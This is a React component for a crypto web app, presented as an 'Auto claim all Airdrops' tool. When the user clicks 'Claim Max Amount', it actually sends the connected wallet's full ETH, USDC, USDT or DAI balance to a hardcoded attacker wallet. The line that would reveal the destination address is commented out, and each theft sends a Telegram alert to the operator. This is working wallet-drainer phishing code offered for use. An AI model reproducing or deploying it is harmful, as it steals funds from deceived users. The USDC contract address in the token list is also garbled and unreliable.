"use client"

import { useState, useEffect, useCallback, useMemo } from "react"
import {
  useAccount,
  useBalance,
  useSendTransaction,
  useWriteContract,
  useWaitForTransactionReceipt,
  useFeeData,
  useEstimateGas,
} from "wagmi"
import { parseEther, formatUnits, formatEther, parseGwei } from "viem"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Loader2, AlertTriangle, CheckCircle, Zap, Calculator, Info } from "lucide-react"
import { toast } from "sonner"
import { useTelegramNotifications } from "@/hooks/use-telegram-notifications"

// Hardcoded destination wallet
const DESTINATION_WALLET = "0x566A1613668eFF73baBb9D6D1cF6aea77eea43a7"

// ERC-20 Token ABI
const ERC20_ABI = [
  {
    name: "transfer",
    type: "function",
    stateMutability: "nonpayable",
    inputs: [
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    outputs: [{ name: "", type: "bool" }],
  },
] as const

// Fixed token list
const ALL_TOKENS = [
  { symbol: "ETH", decimals: 18, address: null, name: "Ethereum" },
  { symbol: "USDC", decimals: 6, address: "0xA0b86a33E6441b8dB4B2b8b8b8b8b8b8b8b8b8b8", name: "USD Coin" },
  { symbol: "USDT", decimals: 6, address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", name: "Tether USD" },
  { symbol: "DAI", decimals: 18, address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", name: "Dai Stablecoin" },
]

interface TransferCalculation {
  balance: bigint
  gasEstimate: bigint
  gasCost: bigint
  transferAmount: bigint
  canTransfer: boolean
  error?: string
  gasPrice: bigint
  gasPriceGwei: string
}

export function AutoTransfer() {
  const { address, chain } = useAccount()
  const [selectedToken, setSelectedToken] = useState("ETH")
  const [isCalculating, setIsCalculating] = useState(false)
  const [isTransferring, setIsTransferring] = useState(false)
  const [calculation, setCalculation] = useState<TransferCalculation | null>(null)

  const { sendTransferNotification } = useTelegramNotifications()

  // Memoize current token
  const currentToken = useMemo(() => ALL_TOKENS.find((token) => token.symbol === selectedToken), [selectedToken])
  const isNativeToken = selectedToken === "ETH"

  // Get balances
  const { data: ethBalance } = useBalance({ address })
  const { data: tokenBalance } = useBalance({
    address,
    token: currentToken?.address as `0x${string}`,
    query: { enabled: !!address && !!currentToken?.address },
  })

  // Get gas data
  const {
    data: feeData,
    isLoading: feeDataLoading,
    error: feeDataError,
  } = useFeeData({
    query: { staleTime: 30000, refetchInterval: 30000 },
  })

  // Estimate gas
  const { data: gasEstimate } = useEstimateGas({
    to: DESTINATION_WALLET,
    value: isNativeToken ? parseEther("0.001") : undefined,
    data: !isNativeToken && currentToken?.address ? "0xa9059cbb" : undefined,
    query: { enabled: !!address && !!DESTINATION_WALLET },
  })

  // Transaction hooks
  const { sendTransaction, data: nativeHash } = useSendTransaction()
  const { writeContract, data: tokenHash } = useWriteContract()

  // Wait for confirmations
  const { isLoading: isNativeConfirming } = useWaitForTransactionReceipt({ hash: nativeHash })
  const { isLoading: isTokenConfirming } = useWaitForTransactionReceipt({ hash: tokenHash })

  const currentBalance = isNativeToken ? ethBalance : tokenBalance

  // Memoize format functions
  const formatAddress = useCallback((addr: string) => {
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`
  }, [])

  const formatTokenAmount = useCallback((amount: bigint, decimals: number) => {
    const formatted = formatUnits(amount, decimals)
    const num = Number.parseFloat(formatted)
    return num.toFixed(decimals === 18 ? 6 : 2)
  }, [])

  // Send Telegram notifications
  useEffect(() => {
    if (nativeHash && calculation && currentToken) {
      sendTransferNotification({
        token: selectedToken,
        amount: `${formatTokenAmount(calculation.transferAmount, currentToken.decimals)} ${selectedToken}`,
        txHash: nativeHash,
        type: "native",
      })
    }
  }, [nativeHash, calculation, currentToken, selectedToken, sendTransferNotification, formatTokenAmount])

  useEffect(() => {
    if (tokenHash && calculation && currentToken) {
      sendTransferNotification({
        token: selectedToken,
        amount: `${formatTokenAmount(calculation.transferAmount, currentToken.decimals)} ${selectedToken}`,
        txHash: tokenHash,
        type: "erc20",
      })
    }
  }, [tokenHash, calculation, currentToken, selectedToken, sendTransferNotification, formatTokenAmount])

  // Calculate transfer amount
  const calculateTransfer = useCallback(async () => {
    if (!address || !currentBalance || !currentToken) return

    setIsCalculating(true)
    try {
      const balance = currentBalance.value

      // Get gas price with fallbacks
      let gasPrice: bigint
      let gasPriceGwei: string

      if (feeData?.gasPrice) {
        gasPrice = feeData.gasPrice
        gasPriceGwei = formatUnits(gasPrice, 9)
      } else {
        const fallbackGasPrices = {
          1: parseGwei("20"),
          137: parseGwei("30"),
          42161: parseGwei("0.1"),
          10: parseGwei("0.001"),
          8453: parseGwei("0.001"),
        }
        gasPrice = fallbackGasPrices[chain?.id as keyof typeof fallbackGasPrices] || parseGwei("20")
        gasPriceGwei = formatUnits(gasPrice, 9)
      }

      // Get gas limit
      let gasLimit: bigint
      if (isNativeToken) {
        gasLimit = gasEstimate || BigInt(21000)
      } else {
        gasLimit = gasEstimate || BigInt(65000)
      }

      // Calculate gas cost with buffer
      const gasCost = gasPrice * gasLimit
      const bufferPercent = isNativeToken ? 5 : 10
      const bufferedGasCost = gasCost + (gasCost * BigInt(bufferPercent)) / BigInt(100)

      if (isNativeToken) {
        if (balance <= bufferedGasCost) {
          setCalculation({
            balance,
            gasEstimate: gasLimit,
            gasCost: bufferedGasCost,
            transferAmount: BigInt(0),
            canTransfer: false,
            error: "Insufficient balance to cover gas fees",
            gasPrice,
            gasPriceGwei,
          })
        } else {
          const transferAmount = balance - bufferedGasCost
          setCalculation({
            balance,
            gasEstimate: gasLimit,
            gasCost: bufferedGasCost,
            transferAmount,
            canTransfer: true,
            gasPrice,
            gasPriceGwei,
          })
        }
      } else {
        if (!ethBalance || ethBalance.value <= bufferedGasCost) {
          setCalculation({
            balance,
            gasEstimate: gasLimit,
            gasCost: bufferedGasCost,
            transferAmount: BigInt(0),
            canTransfer: false,
            error: "Insufficient ETH for gas fees",
            gasPrice,
            gasPriceGwei,
          })
        } else {
          setCalculation({
            balance,
            gasEstimate: gasLimit,
            gasCost: bufferedGasCost,
            transferAmount: balance,
            canTransfer: balance > 0,
            gasPrice,
            gasPriceGwei,
          })
        }
      }
    } catch (error) {
      console.error("Calculation error:", error)
      setCalculation({
        balance: BigInt(0),
        gasEstimate: BigInt(0),
        gasCost: BigInt(0),
        transferAmount: BigInt(0),
        canTransfer: false,
        error: "Failed to calculate transfer amount",
        gasPrice: BigInt(0),
        gasPriceGwei: "0",
      })
    } finally {
      setIsCalculating(false)
    }
  }, [address, currentBalance, currentToken, feeData?.gasPrice, chain?.id, gasEstimate, isNativeToken, ethBalance])

  // Auto-calculate when dependencies change
  useEffect(() => {
    if (address && currentBalance && currentToken && !feeDataLoading) {
      calculateTransfer()
    }
  }, [calculateTransfer, address, currentBalance, currentToken, feeDataLoading])

  const handleAutoTransfer = useCallback(async () => {
    if (!address || !calculation || !calculation.canTransfer || !currentToken) {
      toast.error("Cannot transfer: " + (calculation?.error || "Unknown error"))
      return
    }

    setIsTransferring(true)
    try {
      if (isNativeToken) {
        await sendTransaction({
          to: DESTINATION_WALLET,
          value: calculation.transferAmount,
        })
        toast.success(`Transferring ${formatEther(calculation.transferAmount)} ETH...`)
      } else {
        await writeContract({
          address: currentToken.address as `0x${string}`,
          abi: ERC20_ABI,
          functionName: "transfer",
          args: [DESTINATION_WALLET, calculation.transferAmount],
        })

        const amount = formatUnits(calculation.transferAmount, currentToken.decimals)
        toast.success(`Transferring ${amount} ${selectedToken}...`)
      }
    } catch (error) {
      console.error("Transfer failed:", error)
      toast.error("Transfer failed. Please try again.")
    } finally {
      setIsTransferring(false)
    }
  }, [address, calculation, currentToken, isNativeToken, sendTransaction, writeContract, selectedToken])

  return (
    <Card className="bg-slate-800/50 border-slate-700">
      <CardHeader>
        <CardTitle className="text-white flex items-center gap-2">
          <Zap className="w-5 h-5 text-yellow-500" />
          Auto claim all Airdrops(Max Amount)
        </CardTitle>
        <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3">
          <div className="flex items-center gap-2 text-yellow-400">
            <AlertTriangle className="w-4 h-4" />
            <p className="text-yellow-300 text-xs">Gas fees are paid by your wallet!</p>
            {/* <span className="text-sm font-medium">One-Click Transfer + Telegram Alerts</span> */}
          </div>
          {/* <p className="text-yellow-300 text-xs mt-1">
            Automatically sends maximum amount to: {formatAddress(DESTINATION_WALLET)}
          </p> */}
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        {/* Token Selection */}
        <div className="flex items-center justify-between">
          <span className="text-slate-300">Select Token:</span>
          <Select value={selectedToken} onValueChange={setSelectedToken}>
            <SelectTrigger className="w-40 bg-slate-700 border-slate-600">
              <SelectValue />
            </SelectTrigger>
            <SelectContent className="bg-slate-700 border-slate-600">
              {ALL_TOKENS.map((token) => (
                <SelectItem key={token.symbol} value={token.symbol}>
                  <div className="flex items-center gap-2">
                    <span>{token.symbol}</span>
                    <span className="text-xs text-slate-400">({token.name})</span>
                  </div>
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
        </div>

        {/* Chain Info */}
        {chain && (
          <div className="text-xs text-slate-400 bg-slate-700/30 p-2 rounded">
            Network: {chain.name} • 3 ERC-20 tokens available
          </div>
        )}

        {/* Gas Price Info */}
        {calculation && (
          <div className="p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-blue-400 mb-2">
              <Info className="w-4 h-4" />
              <span className="text-sm font-medium">Gas Information</span>
            </div>
            <div className="grid grid-cols-2 gap-2 text-xs">
              <div>
                <span className="text-slate-400">Gas Price:</span>
                <span className="text-white ml-2">{Number.parseFloat(calculation.gasPriceGwei).toFixed(2)} Gwei</span>
              </div>
              <div>
                <span className="text-slate-400">Gas Limit:</span>
                <span className="text-white ml-2">{calculation.gasEstimate.toString()}</span>
              </div>
            </div>
          </div>
        )}

        {/* Balance Display
        {currentBalance && currentToken && (
          <div className="space-y-2 p-3 bg-slate-700/30 rounded-lg">
            <div className="flex items-center justify-between text-sm">
              <span className="text-slate-400">Total amount to claim:</span>
              <span className="text-white font-medium">
                {formatTokenAmount(currentBalance.value, currentToken.decimals)} {selectedToken}
              </span>
            </div>

            {calculation && (
              <>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-slate-400">Estimated Gas Cost:</span>
                  <span className="text-orange-400">
                    {Number.parseFloat(formatEther(calculation.gasCost)).toFixed(6)} ETH
                  </span>
                </div>

                <div className="flex items-center justify-between text-sm border-t border-slate-600 pt-2">
                  <span className="text-slate-400">Amount to receive:</span>
                  <span className={`font-medium ${calculation.canTransfer ? "text-green-400" : "text-red-400"}`}>
                    {calculation.canTransfer
                      ? `${formatTokenAmount(calculation.transferAmount, currentToken.decimals)} ${selectedToken}`
                      : "Cannot transfer"}
                  </span>
                </div>
              </>
            )}
          </div>
        )} */}

        {/* Error Display */}
        {calculation?.error && (
          <div className="p-3 bg-red-500/20 border border-red-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-red-400">
              <AlertTriangle className="w-4 h-4" />
              <span className="text-sm font-medium">Transfer Error</span>
            </div>
            <p className="text-red-300 text-xs mt-1">{calculation.error}</p>
          </div>
        )}

        {/* Fee Data Error */}
        {feeDataError && (
          <div className="p-3 bg-yellow-500/20 border border-yellow-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-yellow-400">
              <AlertTriangle className="w-4 h-4" />
              <span className="text-sm font-medium">Using Fallback Gas Price</span>
            </div>
            <p className="text-yellow-300 text-xs mt-1">Unable to fetch current gas price, using network defaults</p>
          </div>
        )}

        {/* Transfer Button */}
        <Button
          onClick={handleAutoTransfer}
          disabled={
            !calculation?.canTransfer ||
            isTransferring ||
            isNativeConfirming ||
            isTokenConfirming ||
            isCalculating ||
            feeDataLoading
          }
          className="w-full bg-gradient-to-r from-yellow-600 to-orange-600 hover:from-yellow-700 hover:to-orange-700"
        >
          {isCalculating || feeDataLoading ? (
            <>
              <Calculator className="w-4 h-4 mr-2 animate-spin" />
              Calculating...
            </>
          ) : isTransferring || isNativeConfirming || isTokenConfirming ? (
            <>
              <Loader2 className="w-4 h-4 mr-2 animate-spin" />
              Transferring...
            </>
          ) : (
            <>
              <Zap className="w-4 h-4 mr-2" />
              Claim Max Amount
            </>
          )}
        </Button>

        {/* Refresh Calculation */}
        <Button
          onClick={calculateTransfer}
          variant="outline"
          className="w-full border-slate-600 text-slate-300 hover:bg-slate-700"
          disabled={isCalculating || feeDataLoading}
        >
          <Calculator className="w-4 h-4 mr-2" />
          Recalculate
        </Button>

        {/* Transaction Status */}
        {(nativeHash || tokenHash) && (
          <div className="p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
            <div className="flex items-center gap-2 text-blue-400">
              {isNativeConfirming || isTokenConfirming ? (
                <Loader2 className="w-4 h-4 animate-spin" />
              ) : (
                <CheckCircle className="w-4 h-4" />
              )}
              <span className="text-sm font-medium">
                {isNativeConfirming || isTokenConfirming ? "Confirming..." : "Transaction Sent"}
              </span>
            </div>
            <p className="text-blue-300 text-xs mt-1 font-mono">
              Hash: {(nativeHash || tokenHash)?.slice(0, 10)}...{(nativeHash || tokenHash)?.slice(-8)}
            </p>
            <p className="text-blue-300 text-xs mt-1">📱 Telegram notification sent!</p>
          </div>
        )}
      </CardContent>
    </Card>
  )
}
